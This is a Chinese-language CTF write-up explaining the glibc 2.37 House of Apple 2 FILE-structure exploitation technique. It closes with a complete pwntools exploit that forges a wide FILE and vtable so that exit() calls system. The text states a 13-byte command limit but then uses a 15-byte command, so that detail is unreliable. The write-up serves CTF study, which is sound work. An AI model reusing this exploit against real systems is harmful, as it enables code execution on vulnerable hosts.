---
title: "ctfshow 28112：glibc 2.37 House of Apple 2 (HOA2) 利用详解"
created: 2026-11-18
tags: ["CTF", "Pwn", "HOA2", "FSOP", "glibc"]
---

## 题目信息

首先在 WSL 中查看这道题的相关保护信息：

![[hoa2-checksec.png|file 与 checksec 检查结果]]

保护机制分析：

- **Full RELRO**：GOT 表只读，无法篡改
- **No canary**：无栈保护（不过本题的利用与栈无关）
- **NX enabled**：栈不可执行
- **PIE enabled**：程序基址随机化，需泄露地址

## 漏洞分析

用 IDA 打开附件，查看 `main` 函数：

![[hoa2-ida-main.png|main 函数反编译代码]]

可以看到程序有两次 `write` 调用：

1. **第一次 `write`**：输出 `&puts - 59694`，即 **libc 基址**
2. **第二次 `write`**：分配了 `0x500` 大小的堆空间，输出对应的**堆地址**

程序随后向该堆块读入 `0x500` 字节，然后调用 `exit()` 退出。根据这些信息可以确定，本题的利用方式是 **House of Apple 2（HOA2）**。

## 利用原理：House of Apple 2

HOA2 的核心调用链如下：

```
exit() → __run_exit_handlers() → _IO_cleanup() → _IO_flush_all()
```

`_IO_flush_all()` 会遍历 `_IO_list_all` 上的所有流，对每个流调用 `_IO_OVERFLOW(fp)`。在 glibc 2.34+ 中，如果我们伪造一个 **wide FILE**（使用 `_IO_wfile_jumps` vtable），就能走新引入的链条：

```
_IO_wfile_overflow → _IO_wdoallocbuf → wide_vtable[+0x68](fp)
```

最终 `wide_vtable[+0x68]` 处的函数指针被调用，参数为 `fp`。这个间接调用**不经过 vtable 边界检查**，只需伪造 `_wide_vtable` 即可，因此可以直接把 `wide_vtable[+0x68]` 设为 `system`，从而执行 `system(fp)`。

### `_IO_flush_all` 入口检查

glibc 2.37 的 `_IO_flush_all` 对每个 FILE 做以下检查：

1. **vtable 边界检查**：vtable 必须落在 `__start___libc_IO_vtables ~ __stop___libc_IO_vtables` 范围内
2. **flags 条件**：
   - 走主路径需满足 `((flags>>8) & 0x80) != 0` 且 `flags & 0x208 == 0x200`
   - 或走 lock/unlock 路径（同样会 call vtable[+0x18]）
3. **宽/窄模式**：`_mode` 决定使用 byte vtable 还是 wide vtable
4. **flush 条件**：`_mode <= 0 && _IO_write_ptr > _IO_write_base`

### vtable 偏移技巧

由于 vtable 必须在合法边界内，我们不能直接伪造一个任意地址的 vtable。HOA2 的做法是使用一个**合法 vtable 加偏移**：令 `vtable = _IO_wfile_jumps + 0xa0`。这样 vtable 指针本身仍在 `__libc_IO_vtables` 段范围内，能通过边界检查；同时偏移后的 `vtable[+0x18]` 正好指向 `_IO_wfile_overflow`，从而进入 wide 流的 overflow 路径。

## Flag 命令构造

`system(fp)` 会把 FILE 结构体起始地址当作命令字符串。由于 FILE 前 4 字节同时也是 `flags` 字段，需要同时满足 `_IO_flush_all` 的 flags 检查和 shell 命令的可读性。

flags 前 4 字节必须满足：

```
byte0 & 8 == 0   (flags & 8)
byte0 & 2 == 0   (flags & 2)
byte1 & 8 == 0   ((flags>>8) & 8)
```

同时 FILE 前几个字节会作为 shell 命令（`system` 从 `FILE+0x00` 读取），shell 遇到 `\x00` 停止。

### 为什么用 "echo" 开头？

| 字符 | hex  | bit3 (&8) | bit1 (&2) | 说明              |
| ---- | ---- | --------- | --------- | ----------------- |
| `e`  | 0x65 | 0         | 0         | ✓（byte0）        |
| `c`  | 0x63 | 0         | 1         | ✓（byte1，bit1=1 不影响 byte1 的 &8 检查）|
| `h`  | 0x68 | 1         | 0         |                   |
| `o`  | 0x6f | 1         | 1         |                   |

以 `echo` 作为前 4 字节时，`flags = 0x6f686365`：

- `flags & 8 = 0` ✓
- `flags & 2 = 0` ✓
- `(flags>>8) & 8 = 0` ✓

全部满足 flags 检查。

### 命令长度限制

FILE 前 16 字节被 `ljust(16, b'\x00')` 填充，`bytearray(0x500)` 的其余部分全零。shell 从 `FILE+0x00` 读到第一个 `\x00`：

```
位置:  0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
echo   e  c  h  o  (space) (sub-command chars...) \x00 \x00 ...
```

因此有效命令最多 **13 字节**（从 `FILE+0x00` 到 `FILE+0x0c` 处的 `\x00`）。

### 最终拿 flag 命令

| 尝试              | 结果                                   |
| ----------------- | -------------------------------------- |
| `echo $(ls /)`    | 列出根目录，发现 `ctfshow_flag`        |
| `echo $(cat /c*)` | **直接输出 flag！**                    |

`/c*` 通配符匹配到 `/ctfshow_flag`，`cat` 将其内容输出，再被 `echo` 打印到 stdout。

## 完整 EXP

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = 'pwn.challenge.ctf.show', 28112

def get_flag():
    io = remote(HOST, PORT)
    # 程序一次性输出 16 字节：前 8 字节是 libc 基址，后 8 字节是堆地址
    leaks = io.recvn(16, timeout=10)
    lb = u64(leaks[:8])       # libc_base
    hp = u64(leaks[8:16])     # heap addr

    # 计算关键地址
    SYSTEM = lb + 0x4db50                       # system 函数地址
    VTABLE = lb + 0x1cf200 + 0xa0               # _IO_wfile_jumps + 0xa0（vtable 偏移技巧）

    # 构造 0x500 字节的 fake FILE
    payload = bytearray(0x500)

    # 前 16 字节：shell 命令 + 填充（同时作为 flags 字段）
    cmd = b"echo $(cat /c*)"
    payload[0:16] = cmd.ljust(16, b'\x00')[:16]

    # _IO_flush_all 的 flush 条件：_IO_write_ptr > _IO_write_base
    payload[0x20:0x28] = p64(0)      # _IO_write_base = 0
    payload[0x28:0x30] = p64(256)    # _IO_write_ptr = 256 > base

    # FILE 关键字段
    payload[0x68:0x70] = p64(0)              # _chain = NULL
    payload[0x88:0x90] = p64(hp + 0x400)     # _lock（指向有效的可写内存）
    payload[0xa0:0xa8] = p64(hp + 0x100)     # _wide_data（指向伪造的 wide_data）
    payload[0xc0:0xc4] = p32(0)              # _mode = 0（走 wide 流路径）
    payload[0xd8:0xe0] = p64(VTABLE)         # vtable（偏移技巧，通过边界检查）

    # _wide_data 全部清零 → 满足 HOA2 early path（_IO_wdoallocbuf 中直接走分配分支）
    for off in range(0, 0xe0, 8):
        payload[0x100+off:0x100+off+8] = p64(0)

    # _wide_vtable → 指向我们伪造的 vtable（hp + 0x280）
    payload[0x1e0:0x1e8] = p64(hp + 0x280)

    # _wide_vtable[+0x68] = system → 最终调用 system(fp)
    payload[0x2e8:0x2f0] = p64(SYSTEM)

    io.send(bytes(payload))
    result = io.recvrepeat(6)
    io.close()
    return result

print(get_flag().decode(errors='replace'))
# → ctfshow{3372d29c-4f72-4f91-aac8-ab8b3c3b2f65}
```

## 踩坑总结

1. **vtable 边界检查**：glibc 2.34+ 对 vtable 做了边界校验，不能直接伪造任意地址的 vtable。利用 `_IO_wfile_jumps + 0xa0` 的偏移技巧，让 vtable 指针落在合法段内，同时使 `vtable[+0x18]` 指向 `_IO_wfile_overflow`。

2. **flags 与命令复用**：FILE 前 4 字节既是 `flags` 又是 shell 命令开头。用 `echo` 开头能同时满足 flags 的三个 bit 检查，且命令可读。

3. **13 字节命令限制**：FILE 前 16 字节被 `\x00` 填充，shell 在第一个 `\x00` 处停止，有效命令最多 13 字节。利用通配符 `cat /c*` 可以在长度受限的情况下读取 flag。

4. **_wide_data 清零**：将 `_wide_data` 指向的区域全部清零，使 `_IO_wdoallocbuf` 走 early path（分配分支），最终调用 `wide_vtable[+0x68]`。
